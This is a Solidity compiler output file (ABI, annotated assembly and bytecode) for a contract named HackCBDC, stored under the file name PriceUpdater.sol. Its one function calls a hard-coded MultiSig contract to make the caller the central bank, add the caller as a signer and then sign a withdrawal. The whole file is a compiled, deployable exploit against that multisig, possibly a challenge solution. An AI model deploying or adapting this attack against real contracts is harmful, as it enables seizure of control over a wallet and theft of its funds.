{
	"contracts/PriceUpdater.sol": {
		"HackCBDC": {
			"abi": [
				{
					"inputs": [],
					"name": "hackCBCD",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/PriceUpdater.sol\":338:595  contract HackCBDC {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/PriceUpdater.sol\":360:425  address private cbdc = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA */\n  0x00\n  dup1\n  sload\n  not(sub(exp(0x02, 0xa0), 0x01))\n  and\n    /* \"contracts/PriceUpdater.sol\":383:425  0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA */\n  0x550714e1fd747084fc5cb2b2e3a93512972aebda\n    /* \"contracts/PriceUpdater.sol\":360:425  address private cbdc = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA */\n  or\n  swap1\n  sstore\n    /* \"contracts/PriceUpdater.sol\":338:595  contract HackCBDC {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/PriceUpdater.sol\":338:595  contract HackCBDC {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      div(calldataload(0x00), 0x0100000000000000000000000000000000000000000000000000000000)\n      0x69ae44bf\n      dup2\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/PriceUpdater.sol\":429:593  function hackCBCD() public {... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      stop\n    tag_5:\n        /* \"contracts/PriceUpdater.sol\":471:475  cbdc */\n      sload(0x00)\n        /* \"contracts/PriceUpdater.sol\":462:506  MultiSig(cbdc).updateCentralBank(msg.sender) */\n      mload(0x40)\n      0x077bf51a00000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n        /* \"contracts/PriceUpdater.sol\":495:505  msg.sender */\n      caller\n        /* \"contracts/PriceUpdater.sol\":462:506  MultiSig(cbdc).updateCentralBank(msg.sender) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":160:234   */\n      mstore\n        /* \"contracts/PriceUpdater.sol\":471:475  cbdc */\n      0xffffffffffffffffffffffffffffffffffffffff\n      swap1\n      swap2\n      and\n      swap1\n        /* \"contracts/PriceUpdater.sol\":462:494  MultiSig(cbdc).updateCentralBank */\n      0x077bf51a\n      swap1\n        /* \"#utility.yul\":133:151   */\n      0x24\n      add\n        /* \"contracts/PriceUpdater.sol\":462:506  MultiSig(cbdc).updateCentralBank(msg.sender) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_9\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_9:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_11:\n      pop\n      pop\n        /* \"contracts/PriceUpdater.sol\":521:525  cbdc */\n      sload(0x00)\n        /* \"contracts/PriceUpdater.sol\":512:551  MultiSig(cbdc).addSignature(msg.sender) */\n      mload(0x40)\n      0xf441d21a00000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n        /* \"contracts/PriceUpdater.sol\":540:550  msg.sender */\n      caller\n        /* \"contracts/PriceUpdater.sol\":512:551  MultiSig(cbdc).addSignature(msg.sender) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":160:234   */\n      mstore\n        /* \"contracts/PriceUpdater.sol\":521:525  cbdc */\n      0xffffffffffffffffffffffffffffffffffffffff\n      swap1\n      swap2\n      and\n      swap3\n      pop\n        /* \"contracts/PriceUpdater.sol\":512:539  MultiSig(cbdc).addSignature */\n      0xf441d21a\n      swap2\n      pop\n        /* \"#utility.yul\":133:151   */\n      0x24\n      add\n        /* \"contracts/PriceUpdater.sol\":512:551  MultiSig(cbdc).addSignature(msg.sender) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_15\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_15:\n      pop\n      pop\n        /* \"contracts/PriceUpdater.sol\":566:570  cbdc */\n      0x00\n      dup1\n      sload\n        /* \"contracts/PriceUpdater.sol\":557:588  MultiSig(cbdc).signWithdrawal() */\n      0x40\n      dup1\n      mload\n      0x132ad22300000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"contracts/PriceUpdater.sol\":566:570  cbdc */\n      0xffffffffffffffffffffffffffffffffffffffff\n      swap1\n      swap3\n      and\n      swap5\n      pop\n        /* \"contracts/PriceUpdater.sol\":557:586  MultiSig(cbdc).signWithdrawal */\n      0x132ad223\n      swap4\n      pop\n        /* \"contracts/PriceUpdater.sol\":557:588  MultiSig(cbdc).signWithdrawal() */\n      0x04\n      dup1\n      dup3\n      add\n      swap4\n        /* \"contracts/PriceUpdater.sol\":566:570  cbdc */\n      swap3\n        /* \"contracts/PriceUpdater.sol\":557:588  MultiSig(cbdc).signWithdrawal() */\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"contracts/PriceUpdater.sol\":566:570  cbdc */\n      dup4\n      dup8\n        /* \"contracts/PriceUpdater.sol\":557:588  MultiSig(cbdc).signWithdrawal() */\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/PriceUpdater.sol\":429:593  function hackCBCD() public {... */\n      jump\t// out\n\n    auxdata: 0xa264697066735822122016fd208e40f5b558c390715d40f5f184358080b6d8c2f96bdc43af1d70a839f164736f6c63430008110033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405260008054600160a060020a03191673550714e1fd747084fc5cb2b2e3a93512972aebda17905534801561003657600080fd5b50610215806100466000396000f3fe608060405234801561001057600080fd5b5060043610610047577c0100000000000000000000000000000000000000000000000000000000600035046369ae44bf811461004c575b600080fd5b610054610056565b005b6000546040517f077bf51a00000000000000000000000000000000000000000000000000000000815233600482015273ffffffffffffffffffffffffffffffffffffffff9091169063077bf51a90602401600060405180830381600087803b1580156100c157600080fd5b505af11580156100d5573d6000803e3d6000fd5b50506000546040517ff441d21a00000000000000000000000000000000000000000000000000000000815233600482015273ffffffffffffffffffffffffffffffffffffffff909116925063f441d21a9150602401600060405180830381600087803b15801561014457600080fd5b505af1158015610158573d6000803e3d6000fd5b505060008054604080517f132ad223000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff909216945063132ad2239350600480820193929182900301818387803b1580156101c557600080fd5b505af11580156101d9573d6000803e3d6000fd5b5050505056fea264697066735822122016fd208e40f5b558c390715d40f5f184358080b6d8c2f96bdc43af1d70a839f164736f6c63430008110033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0xA0 PUSH1 0x2 EXP SUB NOT AND PUSH20 0x550714E1FD747084FC5CB2B2E3A93512972AEBDA OR SWAP1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x36 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x215 DUP1 PUSH2 0x46 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x47 JUMPI PUSH29 0x100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 CALLDATALOAD DIV PUSH4 0x69AE44BF DUP2 EQ PUSH2 0x4C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x54 PUSH2 0x56 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH32 0x77BF51A00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE CALLER PUSH1 0x4 DUP3 ADD MSTORE PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP2 AND SWAP1 PUSH4 0x77BF51A SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xC1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xD5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH32 0xF441D21A00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE CALLER PUSH1 0x4 DUP3 ADD MSTORE PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP2 AND SWAP3 POP PUSH4 0xF441D21A SWAP2 POP PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x144 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x158 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH32 0x132AD22300000000000000000000000000000000000000000000000000000000 DUP2 MSTORE SWAP1 MLOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP3 AND SWAP5 POP PUSH4 0x132AD223 SWAP4 POP PUSH1 0x4 DUP1 DUP3 ADD SWAP4 SWAP3 SWAP2 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1D9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 AND REVERT KECCAK256 DUP15 BLOCKHASH CREATE2 0xB5 PC 0xC3 SWAP1 PUSH18 0x5D40F5F184358080B6D8C2F96BDC43AF1D70 0xA8 CODECOPY CALL PUSH5 0x736F6C6343 STOP ADDMOD GT STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "106600",
						"executionCost": "20446",
						"totalCost": "127046"
					},
					"external": {
						"hackCBCD()": "infinite"
					}
				},
				"methodIdentifiers": {
					"hackCBCD()": "69ae44bf"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 102,
						"contract": "contracts/PriceUpdater.sol:HackCBDC",
						"label": "cbdc",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}